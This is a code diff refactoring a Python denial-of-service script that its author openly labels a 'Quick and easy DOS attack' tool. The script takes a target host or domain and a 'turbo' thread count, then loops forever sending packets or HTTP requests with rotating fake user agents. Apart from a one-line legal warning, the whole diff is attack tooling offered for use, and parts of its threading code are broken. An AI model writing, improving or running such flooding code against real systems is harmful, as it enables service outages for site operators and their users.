@@ -2,7 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 Coded by parsa kazazi
-@parsa_kazazi (Github, Twitter)
+GitHub: https://github.com/parsa-kazazi
+Twitter: https://twitter.com/parsa_kazazi
 
 Quick and easy DOS attack python3 script
 Works on all operating systems
@@ -21,22 +22,15 @@ import random
 
 os_name = os.name
 
-def clear():
-    if (os_name == "nt"):
-        os.system("cls")
-    else:
-        os.system("clear")
-
-clear()
 if (os_name == "nt"):
     os.system("title DOS Attack")
 else:
     os.system("printf '\033]2;DOS Attack\a'")
 
 print("""
-    Quick and easy DOS attack (Daniel Of Service)
+    Quick and easy DOS attack (Daniel Of Service). version 1.0
     \033[91m
-    WARNING : This script was created for security testing and simulate a cyber attack.
+    WARNING: This script was created for security testing and simulate a cyber attack.
     Improper use and attacking targets without prior mutual consent is illegal!\033[0m
 """)
 
@@ -44,6 +38,8 @@ put = str("\033[94m[*]\033[0m ")
 info = str("\033[94m[i]\033[0m ")
 good = str("\033[92m[+]\033[0m ")
 error = str("\033[91m[!]\033[0m ")
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # to create connection
 
 user_agents = [
     "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
@@ -110,118 +106,116 @@ user_agents = [
     "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
     "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
     "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
-]
+] # fake user agents
 
-print("\nSelect Attack mode\n\n    1- Packet Send\n    2- HTTP Request Send\n")
-attack_modes = ["1", "2"]
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # to create connection
-attack_mode = input(put + "Attack mode: ")
-if (attack_mode not in attack_modes):
-    print(error + "Invailed input")
-    sys.exit(0)
-elif (attack_mode == "1"):
-    address = input(put + "Doamin or IP address: ")
-    udp_port = input(put + "UDP port (Enter to default 80): ")
-    thread_count = input(put + "Turbo count: ")
-    if (udp_port == ""):
-            udp_port = 80
-    try:
-        thread_count = int(thread_count)
-        udp_port = int(udp_port)
-    except ValueError:
-        print(error + "Invailed input")
-        sys.exit(0)
-    try:
-        ip = socket.gethostbyname(address) # get Website IP address by domain
-    except socket.gaierror:
-        print(error + address + " : Name or service not known")
-        sys.exit(0)
-    print(info + "Checking connection to " + address + " port " + str(udp_port) + " ...")
-    time.sleep(3)
-    try:
-        sock.connect((ip, int(udp_port))) # check the connection
-        sock.settimeout(1)
-    except socket.error:
-        print(error + "Connection failed")
-        sys.exit(0)
-    except socket.gaierror:
-        print(error + address + " : Name or service not known")
-        sys.exit(0)
-    else:
-        time.sleep(1)
-        print(good + "Connected")
-    time.sleep(2)
-    clear()
-    print(info + "Target IP address ......: " + ip)
-    print(info + "Target UDP port ........: " + str(udp_port))
-    print(info + "Attack turbo count .....: " + str(thread_count))
-    input("\n" + put + "Press Enter to continue ")
-    print(info + "For stop attack press CTRL+C\n")
-    time.sleep(5)
-    if (os_name == "nt"):
-        os.system("title Attacking to " + address)
-    else:
-        os.system("printf '\033]2;Attacking to " + address + "\a'")
-     
-elif (attack_mode == "2"):
-    domain = input(put +"Website Domain: ") # domain. exsample : google.com
-    thread_count = input(put + "Turbo count: ") # number of thread count
-    try:
-        thread_count = int(thread_count)
-    except ValueError:
-        print(error + "Invailed input")
-        sys.exit(0)
-    udp_port = 80
-    print(info + "Checking connection to " + domain + " ...")
-    time.sleep(3)
-    try:
-        url = str("http://" + domain + "/")
-        urllib.request.urlopen(url) # connect to Website url
-        ip = socket.gethostbyname(domain)
-    except socket.gaierror:
-        print(error + "Name or service not known\n")
-        sys.exit(0)
-    except urllib.error.URLError:
-        print(error + "URL Error\n")
-        sys.exit(0)
-    except urllib.error.HTTPError:
-        print(error + "HTTP Error\n")
-        sys.exit(0)
-    except ConnectionError:
-        print(error + "Connection Error\n")
-        sys.exit(0)
-    except ConnectionRefusedError:
-        print(error + "Connection Refused\n")
-        sys.exit(0)
-    except ConnectionAbortedError:
-        print(error + "Connection Aborted\n")
-        sys.exit(0)
-    except ConnectionResetError:
-        print(error + "Connection Reset\n")
-        sys.exit(0)
-    else:
-        time.sleep(1)
-        print(good + "Connected")
-    time.sleep(2)
-    clear()
-    print(info + "Website domain .........: " + domain)
-    print(info + "Website ip address .....: " + ip)
-    print(info + "Correct URL ............: " + url)
-    print(info + "Attack turbo count .....: " + str(thread_count))
-    input("\n" + good + "Press Enter to continue ")
-    print(info + "For stop attack press CTRL+C\n")
-    time.sleep(5)
-    if (os_name == "nt"):
-        os.system("title Attacking to " + domain)
-    else:
-        os.system("printf '\033]2;Attacking to " + domain + "\a'")
+class GetParametrs:
+    print("\n" + put + "Select Attack mode\n\n    1- Packet Send\n    2- HTTP Request Send\n")
+    attack_modes = ["1", "2"]
+    attack_mode = input(put + "Attack mode (1/2): ")
+    if (attack_mode not in attack_modes):
+        print(error + "Invailed input\n")
+        exit()
+    elif (attack_mode == "1"):
+        address = input(put + "Target host: ")
+        udp_port = input(put + "UDP port (Enter to default 80): ")
+        thread_count = input(put + "Turbo count: ")
+        if (udp_port == ""):
+                udp_port = 80
+        try:
+            thread_count = int(thread_count)
+            udp_port = int(udp_port)
+        except ValueError:
+            print(error + "Invailed input\n")
+            exit()
+        try:
+            ip = socket.gethostbyname(address) # get target IP address
+            hostname = socket.gethostbyaddr(address)[0] # get target hostname
+        except socket.gaierror:
+            print(error + address + " : Name or service not known\n")
+            exit()
+        print(info + "Checking connection to " + address + " port " + str(udp_port) + " ...")
+        time.sleep(3)
+        try:
+            sock.connect((ip, int(udp_port))) # check the connection
+            sock.settimeout(1)
+        except socket.error:
+            print(error + "Connection failed\n")
+            exit()
+        except socket.gaierror:
+            print(error + address + " : Name or service not known\n")
+            exit()
+        else:
+            time.sleep(1)
+            print(good + "Connected")
+        time.sleep(2)
+        print("\n" + info + "Target address .........: " + hostname + " (" + ip + ")")
+        print(info + "Target UDP port ........: " + str(udp_port))
+        print(info + "Attack turbo count .....: " + str(thread_count))
+        input("\n" + put + "Press Enter to continue ")
+        print(info + "For stop attack press CTRL+C\n")
+        time.sleep(5)
+        if (os_name == "nt"):
+            os.system("title Attacking to " + address)
+        else:
+            os.system("printf '\033]2;Attacking to " + address + "\a'")
+        
+    elif (attack_mode == "2"):
+        domain = input(put +"Website Domain: ") # domain. exsample : google.com
+        thread_count = input(put + "Turbo count: ") # number of thread count
+        try:
+            thread_count = int(thread_count)
+        except ValueError:
+            print(error + "Invailed input\n")
+            exit()
+        udp_port = 80
+        print(info + "Checking connection to " + domain + " ...")
+        time.sleep(3)
+        try:
+            url = str("http://" + domain + "/")
+            urllib.request.urlopen(url) # connect to Website url
+            ip = socket.gethostbyname(domain) # get website IP address by domain
+        except socket.gaierror:
+            print(error + "Name or service not known\n")
+            exit()
+        except urllib.error.URLError:
+            print(error + "URL Error\n")
+            exit()
+        except urllib.error.HTTPError:
+            print(error + "HTTP Error\n")
+            exit()
+        except ConnectionError:
+            print(error + "Connection Error\n")
+            exit()
+        except ConnectionRefusedError:
+            print(error + "Connection Refused\n")
+            exit()
+        except ConnectionAbortedError:
+            print(error + "Connection Aborted\n")
+            exit()
+        except ConnectionResetError:
+            print(error + "Connection Reset\n")
+            exit()
+        else:
+            time.sleep(1)
+            print(good + "Connected")
+        time.sleep(2)
+        print("\n" + info + "Website address ........: " + domain + " (" + ip + ")")
+        print(info + "Correct URL ............: " + url)
+        print(info + "Attack turbo count .....: " + str(thread_count))
+        input("\n" + put + "Press Enter to continue ")
+        print(info + "For stop attack press CTRL+C\n")
+        time.sleep(5)
+        if (os_name == "nt"):
+            os.system("title Attacking to " + domain)
+        else:
+            os.system("printf '\033]2;Attacking to " + domain + "\a'")
 
 def packet_send():
     # send packet to ip address
     while True:
         packet = str("""
 GET / HTTP/1.1
-Host: """ + address + """
+Host: """ + GetParametrs.address + """
 Connection: keep-alive
 User-Agent: """ + str(random.choice(user_agents)) + """
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -231,8 +225,8 @@ Accept-Language: en-US,en;q=0.9
 """)
         try:
             now_time = str(time.strftime("%Y-%m-%d %H:%M:%S"))
-            if (sock.sendto(bytes(packet, "utf-8"), (ip, int(udp_port)))):
-                print(good + now_time + " ==> Packet Sent to " + ip + ":" + str(udp_port))
+            if (sock.sendto(bytes(packet, "utf-8"), (GetParametrs.ip, int(GetParametrs.udp_port)))):
+                print(good + now_time + " ==> Packet Sent to " + GetParametrs.ip + ":" + str(GetParametrs.udp_port))
             else:
                 sock.shutdown()
                 print(error + now_time + " ==> Shut down")
@@ -253,8 +247,8 @@ def request_send():
     while True:
         try:
             now_time = str(time.strftime("%Y-%m-%d %H:%M:%S"))
-            if (urllib.request.urlopen(url)):
-                print(good + now_time + " ==> Request Sent to " + str(url))
+            if (urllib.request.urlopen(GetParametrs.url)):
+                print(good + now_time + " ==> Request Sent to " + str(GetParametrs.url))
             else:
                 sock.shutdown()
                 print(error + now_time + " ==> Shut down")
@@ -275,41 +269,41 @@ def request_send():
             print(error + now_time + " ==> Connection Reset")
     
 def attack():
-    if (attack_mode == "1"):
+    if (GetParametrs.attack_mode == "1"):
         while True:
-            for i in range(int(thread_count)):
+            for i in range(int(GetParametrs.thread_count)):
                 try:
                     threading._start_new_thread(packet_send())
                 except KeyboardInterrupt:
-                    yes_or_no = input(put + "Exit attack? (y/n) : ")
+                    yes_or_no = input(put + "Exit attack? (y/n): ")
                     if (yes_or_no == "y"):
-                        sys.exit(0)
+                        exit()
                     elif (yes_or_no == "n"):
                         attack()
                     elif (yes_or_no == "Y"):
-                        sys.exit(0)
+                        exit()
                     elif (yes_or_no == "N"):
                         attack()
                     else:
                         print(info + "Aborted\n")
-                        sys.exit(0)
-    elif (attack_mode == "2"):
+                        exit()
+    elif (GetParametrs.attack_mode == "2"):
         while True:
-            for i in range(int(thread_count)):
+            for i in range(int(GetParametrs.thread_count)):
                 try:
                     threading._start_new_thread(request_send())
                 except KeyboardInterrupt:
-                    yes_or_no = input(question + "Exit attack? (y/n) : ")
+                    yes_or_no = input(question + "Exit attack? (y/n): ")
                     if (yes_or_no == "y"):
-                        sys.exit(0)
+                        exit()
                     elif (yes_or_no == "n"):
                         attack()
                     elif (yes_or_no == "Y"):
-                        sys.exit(0)
+                        exit()
                     elif (yes_or_no == "N"):
                         attack()
                     else:
                         print(info + "Aborted\n")
-                        sys.exit(0)
+                        exit()
 
 attack()
